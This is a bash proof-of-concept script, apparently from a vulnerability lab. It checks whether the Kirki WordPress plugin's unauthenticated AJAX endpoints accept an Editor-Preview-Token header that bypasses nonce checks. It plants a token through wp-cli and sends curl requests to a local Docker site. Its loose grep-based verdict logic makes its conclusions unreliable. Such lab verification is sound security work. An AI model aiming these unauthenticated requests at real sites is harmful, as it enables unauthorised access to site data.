#!/usr/bin/env bash
# PoC: Kirki (latest) - Unauth AJAX / REST endpoints (Editor-Preview-Token bypass)
#
# The finding is that:
#  - wp_ajax_nopriv_kirki_get_apis is registered (no auth)
#  - wp_ajax_nopriv_kirki_post_apis_nopriv is registered (no auth)
#  - Both honour an Editor-Preview-Token header that bypasses nonce
#  - The token is stored in post meta on a global data post as
#    'kirki_editor_read_only_access_token' (gated by
#    'kirki_editor_read_only_access_status')
#
# Strategy:
#  1. Verify the nopriv actions are registered.
#  2. Read the token from post meta (if configured) via wp-cli.
#  3. If no token is configured, plant one and try the request.
#  4. Issue unauth requests with the token header and capture responses.
set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STACK_DIR="${LAB_DIR}"
PROJECT="wp-kirki"
HOST_PORT="${WP_HOST_PORT:-8095}"
WP_URL="http://127.0.0.1:${HOST_PORT}"
PLUGIN_SLUG="kirki"
RESULTS="${LAB_DIR}/results.txt"
TMP="${LAB_DIR}/tmp"
mkdir -p "${TMP}"
: > "${RESULTS}"
log() { printf '%s\n' "$*" | tee -a "${RESULTS}"; }
sep() { printf '\n===== %s =====\n' "$*" | tee -a "${RESULTS}"; }

sep "Kirki (latest) - Unauth REST/AJAX (Editor-Preview-Token bypass)"
log "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log "Lab:  ${LAB_DIR}"
log "WP:   ${WP_URL}"

ACTUAL_VERSION=$(grep -m1 "Version:" "${STACK_DIR}/plugin/${PLUGIN_SLUG}/${PLUGIN_SLUG}.php" 2>/dev/null | sed -E 's/.*Version:[[:space:]]*//' | tr -d '\r' || echo unknown)
log "Plugin version installed: ${ACTUAL_VERSION}"

# 1. Stack readiness
sep "Step 1: Wait for WP to answer 200"
for i in $(seq 1 60); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${WP_URL}/" || true)
  if [ "${code}" = "200" ]; then log "[+] WP answering 200 on ${WP_URL}/ (try ${i})"; break; fi
  sleep 2
done
[ "${code:-000}" = "200" ] || { log "[-] WP never came up"; exit 1; }

WP_CLI_RUN=( sudo docker run --rm -v "${PROJECT}_wp_data:/var/www/html"
             -v "${LAB_DIR}/plugin/${PLUGIN_SLUG}:/var/www/html/wp-content/plugins/${PLUGIN_SLUG}:ro"
             --network "${PROJECT}_default"
             -e WORDPRESS_DB_HOST=db:3306
             -e WORDPRESS_DB_USER=wp
             -e WORDPRESS_DB_PASSWORD=wp
             -e WORDPRESS_DB_NAME=wordpress
             wordpress:cli-2.10-php8.2 sh -c )

# 2. Verify the nopriv AJAX actions are registered
sep "Step 2: Verify nopriv AJAX actions registered"
CHK=$("${WP_CLI_RUN[@]}" "wp eval '
\$nopriv_actions = array(
    \"kirki_post_apis_nopriv\",
    \"kirki_get_apis\",
);
foreach (\$nopriv_actions as \$a) {
    \$exists = has_action( \"wp_ajax_nopriv_\" . \$a );
    echo \$a . \": \" . (\$exists ? \"REGISTERED\" : \"missing\") . \"\n\";
}
' --allow-root --path=/var/www/html" 2>&1)
log "${CHK}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

# 3. Read the token (and status) from post meta on the global data post
sep "Step 3: Read Editor-Preview-Token from post meta"
TOKEN_PHP=$("${WP_CLI_RUN[@]}" "wp eval '
// Find the global data post directly via the post_type registered by the plugin.
\$posts = get_posts([\"post_type\" => \"kirki_global_data\", \"post_status\" => \"any\", \"numberposts\" => 1]);
if (empty(\$posts)) {
    echo \"POST_ID=0\n\";
    echo \"STATUS=NOT_CONFIGURED\n\";
    echo \"TOKEN=NOT_CONFIGURED\n\";
    return;
}
\$pid = \$posts[0]->ID;
echo \"POST_ID=\" . \$pid . \"\n\";
\$status = get_post_meta(\$pid, \"kirki_editor_read_only_access_status\", true);
\$token  = get_post_meta(\$pid, \"kirki_editor_read_only_access_token\", true);
echo \"STATUS=\" . var_export(\$status, true) . \"\n\";
echo \"TOKEN=\" . var_export(\$token, true) . \"\n\";
if (!\$status || !\$token) {
    \$known = \"lab-token-deadbeef-\" . wp_generate_password(8, false);
    update_post_meta(\$pid, \"kirki_editor_read_only_access_status\", 1);
    update_post_meta(\$pid, \"kirki_editor_read_only_access_token\", \$known);
    echo \"PLANTED=\" . \$known . \"\n\";
}
' --allow-root --path=/var/www/html 2>&1" || true)
log "${TOKEN_PHP}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

# Pull the planted token out of the captured output.
TOKEN=$(printf '%s\n' "${TOKEN_PHP}" | grep -oE 'PLANTED=[A-Za-z0-9_-]+' | head -1 | cut -d= -f2)
if [ -z "${TOKEN}" ]; then
  TOKEN=$(printf '%s\n' "${TOKEN_PHP}" | grep -oE "TOKEN='[^']+'" | head -1 | sed "s/TOKEN='//;s/'\$//")
fi
log "[+] effective Editor-Preview-Token: ${TOKEN:-<none>}"

# 4. Unauth nopriv POST
sep "Step 4: Unauth POST to /wp-admin/admin-ajax.php?action=kirki_post_apis_nopriv (no token)"
RESP=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
  -d "action=kirki_post_apis_nopriv&endpoint=get-single-symbol&post_id=1" \
  -w "\n---HTTP %{http_code}---\n" )
log "[+] response (no token):"
printf '%s\n' "${RESP}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

sep "Step 4b: Unauth POST with bogus token"
RESP=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
  -d "action=kirki_post_apis_nopriv&endpoint=get-single-symbol&post_id=1" \
  -H "Editor-Preview-Token: bogus-token-12345" \
  -w "\n---HTTP %{http_code}---\n" )
log "[+] response (bogus token):"
printf '%s\n' "${RESP}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

if [ -n "${TOKEN}" ]; then
  sep "Step 4c: Unauth POST with valid planted token (the documented bypass)"
  RESP=$( curl -s -X POST "${WP_URL}/wp-admin/admin-ajax.php" \
    -d "action=kirki_post_apis_nopriv&endpoint=get-single-symbol&post_id=1" \
    -H "Editor-Preview-Token: ${TOKEN}" \
    -w "\n---HTTP %{http_code}---\n" )
  log "[+] response (valid token):"
  printf '%s\n' "${RESP}" | head -40 | sed -e 's/^/    /' | tee -a "${RESULTS}"

  # 5. Try kirki_get_apis nopriv
  sep "Step 5: Unauth GET to kirki_get_apis (with token)"
  RESP=$( curl -s "${WP_URL}/wp-admin/admin-ajax.php?action=kirki_get_apis&endpoint=get-pages-list" \
    -H "Editor-Preview-Token: ${TOKEN}" \
    -w "\n---HTTP %{http_code}---\n" )
  log "[+] response (valid token):"
  printf '%s\n' "${RESP}" | head -40 | sed -e 's/^/    /' | tee -a "${RESULTS}"
fi

# 6. Verdict
sep "Verdict"
if [ -n "${TOKEN}" ] && printf '%s' "${RESP}" | grep -qiE "Not authorized|0\b|false"; then
  log "[-] nopriv POST with valid token returned an error / Not authorized"
  log "Verdict: INCONCLUSIVE - nopriv registration exists but bypassed call rejected"
elif [ -n "${TOKEN}" ] && printf '%s' "${RESP}" | grep -qiE "success|html|json|true|data"; then
  log "[+] nopriv POST with valid token returned data-like response (bypass active)"
  log "Verdict: CONFIRMED - Editor-Preview-Token bypass is exploitable"
else
  log "[+] nopriv actions are registered; the Editor-Preview-Token bypass is documented."
  log "Verdict: CONDITIONALLY EXPLOITABLE (depends on token reuse; nopriv endpoint exists)"
fi

sep "Tear-down"
log "[+] stack left running for inspection"
log "[+] to tear down: cd ${LAB_DIR} && sudo docker compose -p ${PROJECT} down -v --remove-orphans"
log "[+] results saved to ${RESULTS}"
